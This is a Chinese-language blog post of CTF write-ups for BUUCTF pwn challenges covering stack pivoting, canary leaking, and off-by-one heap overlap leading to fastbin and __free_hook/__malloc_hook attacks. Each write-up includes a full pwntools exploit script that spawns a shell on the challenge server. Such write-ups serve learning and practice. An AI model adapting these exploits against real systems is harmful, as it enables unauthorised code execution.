---
title: buuctf-pwn write-ups (8)
date: 2023-02-28 22:11:00
categories:
- write-ups
- buuctf 系列
---
# buu062-gyctf_2020_borrowstack
栈迁移。常规的栈迁移方法是返回到leave指令，之前修改rbp到合适的值。我们将rbp修改到bss段的内部，将栈迁移到这里。需要注意不能将栈迁移到变量bank的开头，因为后面还需要调用puts等函数，往上可能会覆盖某些重要数据。因此迁移的地址应该尽量靠后（下面脚本中迁移的地址是bank+0xA0）。使用puts函数读取got表，获取到libc版本，然后使用one_gadget即可getshell。（经过尝试，本题使用system("/bin/sh")不可行，原因不明）

```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29767)
elf = ELF('./pwn')

addrsp_8_ret = 0x4004c5
pop3_ret = 0x4006ff
poprdi_ret = 0x400703
poprsi_r15_ret = 0x400701
gadget = 0x4006FA
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

payload = cyclic(0x60)
payload += p64(0x601080 - 8 + 0xA0)    # new ebp
payload += p64(0x400699)    # leave

io.sendafter(b'Tell me what you want\n', payload)

payload = cyclic(0xA0)
payload += p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(poprdi_ret)
payload += p64(0)
payload += p64(poprsi_r15_ret)
payload += p64(0x601080 + 0x48 + 0xA0)
payload += p64(0xdeadbeef)
payload += p64(elf.plt['read'])	# 仅设定了read函数的前两个参数，第三个参数size没有设置，但是是一个很大的值
io.sendafter(b'stack now!\n', payload)
puts = u64(io.recv(6) + b'\x00\x00')

libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
payload = p64(base + one_gadgets[3])

io.send(payload)
io.interactive()
```
# buu063-others_babystack
简单的canary泄露栈溢出。

```python
from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29017)
def Input(content):
    io.sendafter(b'>> ', b'1'.ljust(0x20, b' '))
    io.send(content)
def Output():
    io.sendafter(b'>> ', b'2'.ljust(0x20, b' '))
Input(cyclic(0x89))
Output()
io.recv(0x88)
canary = u64(io.recv(8))
canary &= 0xFFFFFFFFFFFFFF00
print(hex(canary))

payload = cyclic(0x90)
payload += p64(0xdeadbeefdeadbeef)
Input(payload)
Output()
io.recv(0x98)
retaddr = u64(io.recv(6) + b'\x00\x00')
print(hex(retaddr))
libc_start_main = retaddr - 240
libc = LibcSearcher('__libc_start_main', libc_start_main)
base = libc_start_main - libc.dump('__libc_start_main')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0x88)
payload += p64(canary)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0x400A93)
payload += p64(binsh)
payload += p64(sys)
Input(payload)
io.sendafter(b'>> ', b'3'.ljust(0x20, b' '))
io.interactive()
```
# buu064-0ctf_2017_babyheap
同第29题。
# buu065-hitcontraining_heapcreator
![](1.png)
容易得到程序控制的结构体如上，一共可以申请至多10个这样的结构体。包含创建、删除、打印、修改选项，其中修改选项中含有off by one漏洞。
![](2.png)
这里read_input函数中使用的是read函数，因此这一个溢出的字节可以是任何值。将这个字节的值变大会导致堆块重叠。
![](3.png)

这里插一条笔记：
> 如果使用free函数释放紧邻top chunk下面的大于最大fastbin容纳范围的chunk，当这个chunk的大小加上top chunk的大小大于FASTBIN_CONSOLIDATION_THRESHOLD（65536）时会触发malloc_consolidate()函数将所有的fastbin清空并归位到unsorted bins中。详情请见[源码](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c)第4054~4076行。调试中无意发现，在此记录，与本题关系不大。

经过调试验证，证实上面的思路是正确的。我们成功通过off by one漏洞获取到一个chunk_info的读写权限。
![](4.png)
![](5.png)
那么，后面的思路也就清晰了：将后面一个chunk_info的可读写空间调大，获取到#4中的main_arena地址，进而计算libc基地址。然后直接将#3的可写地址改为__free_hook地址，写入one_gadget，再调用free函数即可getshell。
![](6.png)

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', log_level='debug')

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27833)
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
elf = ELF('./pwn')


def create(size, content):
    io.sendlineafter(b'Your choice :', b'1')
    io.sendlineafter(b'Size of Heap : ', str(size).encode())
    io.sendafter(b'Content of heap:', content)


def edit(index, content):
    io.sendlineafter(b'Your choice :', b'2')
    io.sendlineafter(b'Index :', str(index).encode())
    io.sendafter(b'Content of heap : ', content)


def show(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.sendlineafter(b'Index :', str(index).encode())


def delete(index):
    io.sendlineafter(b'Your choice :', b'4')
    io.sendlineafter(b'Index :', str(index).encode())


create(0x48, b'colin')  # heaparray[0]
create(0x48, b'colin')  # heaparray[1]
create(0x48, b'colin')  # heaparray[2]
edit(0, cyclic(0x48) + b'\x91')
delete(1)
create(0x68, b'colin')  # heaparray[1]
edit(1, cyclic(0x40) + p64(0x51) + p64(0x21) + p64(0x100))  # change the readable size of heaparray[2]
create(0x88, b'colin')  # heaparray[3]
create(0x68, b'colin')  # heaparray[4]
delete(3)
payload = cyclic(0x70)
edit(2, payload)
show(2)
io.recvuntil(b'aabcaab')
main_arena = u64(io.recv(6) + b'\x00\x00') - 88
__malloc_hook = main_arena - 0x10
print(hex(main_arena))
libc = LibcSearcher("__malloc_hook", __malloc_hook)
base = __malloc_hook - libc.dump("__malloc_hook")
sys = base + libc.dump("system")
binsh = base + libc.dump("str_bin_sh")
__free_hook = base + libc.dump("__free_hook")

# 下面的这个payload是用来还原部分堆环境的
# 因为前面读取使用printf函数，在main_arena地址之前不能有空字节，所以会覆盖掉两个chunk的控制信息
# 这里将其还原，保证后面创建chunk的时候能够正常
payload = cyclic(0x40)
payload += p64(0x50)
payload += p64(0x21)
payload += p64(0x90)
payload += p64(0xdeadbeef)     # change write address to __free_hook
payload += p64(0x20)
payload += p64(0x90)
edit(2, payload)

create(0x68, b'colin')  # heaparray[4], reallocate

payload = cyclic(0x40)
payload += p64(0x50)
payload += p64(0x21)
payload += p64(0x90)
payload += p64(__free_hook)     # change write address to __free_hook
payload += p64(0x20)
payload += p64(0x90)

edit(2, payload)
edit(3, p64(base + one_gadgets[1]))
delete(0)

io.interactive()
```
# buu066-roarctf_2019_easy_pwn
也是一道考察off by one漏洞的题目。
经过分析，本题使用的数据结构如下：一共可以创建至多16个这样的结构。
![](7.png)
在write_note实现函数中，当输入的size值是原来定义值-10时会触发一个off by one漏洞，能够溢出一个字节。
![](8.png)
可见本题的思路和上一题类似，但由于本题的堆环境不同，需要对利用姿势加以修改。
![](9.png)

如上图所示，我们通过off by one漏洞将下一个chunk的size改大，使其能够正好覆盖下一个chunk。由于可读写的空间大小保存在bss段，因此此时我们可读写的空间大小实际上并没有改变。然后将这个改大的chunk释放，这样就会产生一个和下一个chunk完全重合的free chunk，在内部保存有main_arena的地址。通过读取下一个chunk即可获取。
![](10.png)
获取到__malloc_hook的地址之后，我们可以通过上图的方式进行fastbin attack。同样是堆块重叠，但这次是将整个unsorted bin chunk都重新申请回来，通过中间的chunk #4修改chunk #5的fd指针到__malloc_hook，这样可以在接下来申请到__malloc_hook处的chunk。

然后，我们可以在__malloc_hook中写入one_gadget的地址。但经过测试发现，能够使用的4个one_gadget都不能让我们获得shell。通过one_gadget打印出来的地址可以知道，这些one_gadget想要执行是有一定条件的，如栈上某个地址需要为0，rax为0等等。如果直接将one_gadget写入__malloc_hook不行，可以考虑将one_gadget写到__realloc_hook中，在__malloc_hook中写realloc函数中的地址，注意我们想要修改栈的环境，需要写realloc+4的地址，这样可以避免执行push rbp; mov rbp, rsp这两条指令，从而产生8字节的错位。

```python
from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')
io = process('./pwn')
# io = remote('node4.buuoj.cn', 25959)
elf = ELF('./pwn')
# one_gadgets = [0x3f4b6, 0x3f50a, 0xd5a27]
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
# one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
# one_gadgets = [0x3f4a6, 0x3f4fa, 0xd5b87]

def create_note(size):
    io.sendlineafter(b'choice: ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())

def write_note(index, size, content):
    io.sendlineafter(b'choice: ', b'2')
    io.sendlineafter(b'index: ', str(index).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'content: ', content)

def drop_note(index):
    io.sendlineafter(b'choice: ', b'3')
    io.sendlineafter(b'index: ', str(index).encode())

def show_note(index):
    io.sendlineafter(b'choice: ', b'4')
    io.sendlineafter(b'index: ', str(index).encode())

create_note(0x48)   # chunk_info #0
create_note(0x48)   # chunk_info #1
create_note(0x88)   # chunk_info #2

create_note(0x18)   # chunk_info #3
create_note(0x18)   # chunk_info #4
create_note(0x68)   # chunk_info #5

create_note(0x18)   # chunk_info #6
write_note(0, 0x48+10, cyclic(0x48) + b'\xE1')
drop_note(1)
create_note(0x48)   # chunk_info #1
show_note(2)
io.recvuntil(b'content: ')
main_arena = u64(io.recv(8)) - 88
print(hex(main_arena))
__malloc_hook = main_arena - 0x10
libc = LibcSearcher("__malloc_hook", __malloc_hook)
base = __malloc_hook - libc.dump('__malloc_hook')
__free_hook = base + libc.dump('__free_hook')
realloc = base + libc.dump('realloc')
create_note(0x88)   # chunk_info #7, same addr as #2
write_note(3, 0x18+10, cyclic(0x18) + b'\x91')
drop_note(4)
create_note(0x88)   # chunk_info #4, overlap #5
write_note(4, 0x88, (b'\x00' * 0x10 + p64(0x20) + p64(0x71)).ljust(0x88, b'\x00'))
drop_note(5)
write_note(4, 0x88, (b'\x00' * 0x10 + p64(0x20) + p64(0x71) + p64(__malloc_hook - 0x23)).ljust(0x88, b'\x00'))
create_note(0x68)   # chunk_info #5
create_note(0x68)   # chunk_info #8, to __malloc_hook
write_note(8, 0x13 + 8, b'\x00' * 0xB + p64(base + one_gadgets[3]) + p64(realloc + 4))
create_note(0x38)

io.interactive()
```
